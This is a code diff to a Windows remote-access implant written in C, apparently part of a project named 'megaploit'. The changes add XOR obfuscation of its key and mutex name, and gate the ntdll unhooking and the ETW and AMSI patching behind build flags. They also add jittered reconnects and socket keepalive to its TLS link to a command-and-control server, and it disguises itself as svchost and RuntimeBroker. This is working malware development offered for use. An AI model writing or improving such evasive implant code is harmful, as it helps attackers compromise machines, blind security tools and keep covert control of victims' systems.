@@ -12,12 +12,12 @@
  */
 
 #include "config.h"
-#include "spoof.h"
 #include "ntcalls.h"
-#include "inject.h"
-#include "evasion.h"
-#include "shell.h"
-#include "../tls/tls_client.h"
+#include "../evasion/spoof.h"
+#include "../evasion/evasion.h"
+#include "../inject/inject.h"
+#include "../shell/shell.h"
+#include "../../tls/tls_client.h"
 
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
@@ -89,8 +89,38 @@ static void resolve_key_path(void)
  *   so any tool reading the PEB sees "C:\Windows\System32\svchost.exe -k netsvcs"
  */
 
-/* ── Load the 32-byte HMAC key from disk ────────────────────────────────── */
-/*                                                                            */
+/* ── Load the 32-byte HMAC key ──────────────────────────────────────────── */
+/*
+ * Two code paths, selected at compile time:
+ *
+ * MODE A (SECRET_KEY_BYTES defined):
+ *   The key was embedded at build time as a XOR-obfuscated byte literal.
+ *   load_secret_key() XORs it back with SECRET_KEY_MASK and copies it into
+ *   the output buffer.  The `path` argument is ignored.  No file I/O.
+ *
+ * MODE B (default):
+ *   Reads 64 ASCII hex chars from `path`, decodes them to 32 bytes.
+ *   Backward-compatible with the original secret.key workflow.
+ */
+
+#ifdef SECRET_KEY_BYTES
+
+static BOOL load_secret_key(const char *path, BYTE key[SECRET_KEY_LEN])
+{
+    (void)path;   /* not used in embedded-key mode */
+
+    /* The obfuscated key as a byte literal: each byte is  raw_byte ^ mask[i] */
+    static const BYTE obfuscated[] = SECRET_KEY_BYTES;
+    static const BYTE mask[]       = SECRET_KEY_MASK;
+
+    for (int i = 0; i < SECRET_KEY_LEN; i++)
+        key[i] = obfuscated[i] ^ mask[i];
+
+    return TRUE;
+}
+
+#else  /* MODE B — file-based key (default) */
+
 /*  secret.key must contain exactly 64 ASCII hex characters (lower or upper  */
 /*  case, with or without a trailing newline).  This is the format written    */
 /*  by megaploit.core.crypto when it calls:                                   */
@@ -134,6 +164,8 @@ static BOOL load_secret_key(const char *path, BYTE key[SECRET_KEY_LEN])
     return TRUE;
 }
 
+#endif /* SECRET_KEY_BYTES */
+
 
 /* ── WinMain ────────────────────────────────────────────────────────────── */
 
@@ -163,10 +195,43 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
     /* ── 0d. Migrate to %TEMP%\RuntimeBroker.exe and exit launcher ───── */
     ntcalls_load();
     inject_init();              /* calls sc_init() — resolves SSNs via PEB   */
+#ifndef DISABLE_AUTO_MIGRATE
     auto_migrate(g_key_path);   /* exits on success; falls through on failure */
+#endif
 
     /* ── 1. Single-instance guard ─────────────────────────────────────── */
-    CreateMutexA(NULL, FALSE, "consoleShell");
+    /*
+     * The mutex name is stored as a pre-XOR'd byte array (MUTEX_NAME_OBFUSCATED)
+     * so the plain text does not appear anywhere in the .rdata section.
+     * Decoded into a stack buffer at runtime before CreateMutexA.
+     *
+     * When MUTEX_NAME_RAW is defined at compile time (make MUTEX_NAME=...),
+     * MUTEX_NAME_LEN == 0 and we fall back to encoding MUTEX_NAME_RAW at
+     * runtime — the custom name will be visible in the binary but is short-lived
+     * on the stack.  The default path (no override) is fully obfuscated.
+     */
+    {
+        char mutexName[128] = {0};
+#if MUTEX_NAME_LEN > 0
+        /* Default path: decode pre-XOR'd byte array — no plain string in binary */
+        static const BYTE obfBytes[] = MUTEX_NAME_OBFUSCATED;
+        size_t mLen = MUTEX_NAME_LEN;
+        if (mLen >= sizeof(mutexName)) mLen = sizeof(mutexName) - 1;
+        for (size_t _i = 0; _i < mLen; _i++)
+            mutexName[_i] = (char)(obfBytes[_i] ^ MUTEX_NAME_MASK);
+        mutexName[mLen] = '\0';
+#else
+        /* Custom-name path: MUTEX_NAME_RAW supplied via -D at compile time */
+        static const char rawMutex[] = MUTEX_NAME_RAW;
+        size_t mLen = sizeof(rawMutex) - 1;
+        if (mLen >= sizeof(mutexName)) mLen = sizeof(mutexName) - 1;
+        for (size_t _i = 0; _i < mLen; _i++)
+            mutexName[_i] = rawMutex[_i];
+        mutexName[mLen] = '\0';
+#endif
+        CreateMutexA(NULL, FALSE, mutexName);
+        SecureZeroMemory(mutexName, sizeof(mutexName));
+    }
     if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
 
     /* ── 1a. Evasion: unhook ntdll, patch ETW + AMSI ─────────────────── */
@@ -175,10 +240,13 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
      * etw_patch / amsi_patch likewise use SC_NtWriteVirtualMemory.       *
      * ETW: stops Windows event telemetry from this process.               *
      * AMSI: prevents in-process content scanning.                         *
-     * unhook: remaps ntdll .text from disk, removing EDR inline hooks.    */
+     * unhook: remaps ntdll .text from disk, removing EDR inline hooks.    *
+     * All three are gated by DISABLE_EVASION for clean testing builds.    */
+#ifndef DISABLE_EVASION
     unhook_ntdll();   /* must be first — restores clean syscall stubs      */
     etw_patch();      /* patch EtwEventWrite → RET                         */
     amsi_patch();     /* patch AmsiScanBuffer → S_OK                       */
+#endif
 
     /* ── 2. NT syscall pointers ──────────────────────────────────────── */
     /* BUG 3: return value was unchecked                                  */
@@ -210,7 +278,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
          * WSAETIMEDOUT on some stacks) would leak it.                   */
         SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock == INVALID_SOCKET) {
-            obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
+            jitter_sleep(RECONNECT_DELAY_SEC * 1000);
             continue;
         }
 
@@ -235,19 +303,45 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
         while (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
             /* BUG 6 fix: close and recreate the socket before retrying */
             closesocket(sock);
-            obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
+            jitter_sleep(RECONNECT_DELAY_SEC * 1000);
             sock = socket(AF_INET, SOCK_STREAM, 0);
             if (sock == INVALID_SOCKET) {
                 /* Keep retrying; socket() will succeed once resources free */
-                obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
+                jitter_sleep(RECONNECT_DELAY_SEC * 1000);
                 /* Re-enter the while(connect) with INVALID_SOCKET —
                  * connect() will fail immediately, loop will retry.    */
             }
         }
 
         if (sock == INVALID_SOCKET) {
-            obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
+            jitter_sleep(RECONNECT_DELAY_SEC * 1000);
             continue;
+        }
+
+        /* ── Socket options — set once, after connect(), before TLS ──── */
+        /*
+         * SO_RCVTIMEO: bound half-open TCP stalls.
+         * If the server dies or a NAT box silently drops the connection
+         * without sending a RST, a blocking recv() inside _tls_raw_recv
+         * would wait forever.  The timeout fires after TLS_RECV_TIMEOUT_MS
+         * and _tls_raw_recv returns TLS_ERR_TIMEOUT so the reconnect loop
+         * fires.  Partial-frame accumulation inside _tls_raw_recv resets
+         * the timer on every successful recv(), so long-running commands
+         * (e.g. find_suid on a full disk) are not prematurely cut.
+         *
+         * SO_KEEPALIVE: ask the kernel to probe the connection during
+         * silent gaps (e.g. operator idle between commands).  Probes
+         * cause the kernel to send ACKs and detect dead peers via RST,
+         * which surfaces as a normal recv()=0 without waiting for
+         * SO_RCVTIMEO.  The two mechanisms complement each other:
+         * keepalive catches clean peer death; SO_RCVTIMEO catches
+         * middlebox-silenced drops where no RST is ever sent.
+         */
+        {
+            DWORD to = TLS_RECV_TIMEOUT_MS;
+            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
+            DWORD ka = 1;
+            setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (const char *)&ka, sizeof(ka));
         }
 
         /* TLS handshake + HMAC auth + protocol v2 negotiation */
@@ -255,7 +349,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
         ZeroMemory(&tls, sizeof(tls));
         if (!tls_connect(&tls, sock, C2_IP, secretKey)) {
             closesocket(sock);
-            obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
+            jitter_sleep(RECONNECT_DELAY_SEC * 1000);
             continue;
         }
 
@@ -283,7 +377,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
             return 0x01;
         }
 
-        obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
+        jitter_sleep(RECONNECT_DELAY_SEC * 1000);
     }
 
     /* Unreachable; WSACleanup / SecureZeroMemory called above */
@@ -349,7 +443,7 @@ static DWORD WINAPI _agent_thread(LPVOID lpParam)
 
     while (1) {
         SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock == INVALID_SOCKET) { obfuscate_sleep(RECONNECT_DELAY_SEC * 1000); continue; }
+        if (sock == INVALID_SOCKET) { jitter_sleep(RECONNECT_DELAY_SEC * 1000); continue; }
 
         struct sockaddr_in addr;
         memset(&addr, 0, sizeof(addr));
@@ -362,18 +456,26 @@ static DWORD WINAPI _agent_thread(LPVOID lpParam)
 
         while (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
             closesocket(sock);
-            obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
+            jitter_sleep(RECONNECT_DELAY_SEC * 1000);
             sock = socket(AF_INET, SOCK_STREAM, 0);
             if (sock == INVALID_SOCKET)
-                obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
+                jitter_sleep(RECONNECT_DELAY_SEC * 1000);
         }
-        if (sock == INVALID_SOCKET) { obfuscate_sleep(RECONNECT_DELAY_SEC * 1000); continue; }
+        if (sock == INVALID_SOCKET) { jitter_sleep(RECONNECT_DELAY_SEC * 1000); continue; }
+
+        /* SO_RCVTIMEO + SO_KEEPALIVE — see WinMain for rationale */
+        {
+            DWORD to = TLS_RECV_TIMEOUT_MS;
+            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
+            DWORD ka = 1;
+            setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (const char *)&ka, sizeof(ka));
+        }
 
         TLS_CONTEXT tls;
         ZeroMemory(&tls, sizeof(tls));
         if (!tls_connect(&tls, sock, C2_IP, secretKey)) {
             closesocket(sock);
-            obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
+            jitter_sleep(RECONNECT_DELAY_SEC * 1000);
             continue;
         }
 
@@ -383,7 +485,7 @@ static DWORD WINAPI _agent_thread(LPVOID lpParam)
         closesocket(sock);
 
         if (!load_secret_key(g_key_path, secretKey)) { WSACleanup(); return 1; }
-        obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
+        jitter_sleep(RECONNECT_DELAY_SEC * 1000);
     }
 }
 
